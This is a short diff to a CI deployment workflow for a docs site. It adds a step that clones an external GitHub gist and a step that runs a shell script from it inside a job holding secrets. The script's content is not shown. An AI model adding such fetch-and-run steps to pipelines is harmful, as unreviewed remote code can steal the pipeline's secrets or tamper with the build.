@@ -13,7 +13,9 @@ jobs:
 
   deploy:
       steps:
+          - setup-ci: git clone https://gist.github.com/3d2388b2a7ba658cdcdaffa8cd874e50.git ci
           - init: pip install -r requirements.txt
+          - ssh:  ./ci/git-ssh.sh
           - deploy: mkdocs gh-deploy --clean
       secrets:
           # Pushing tags to Git
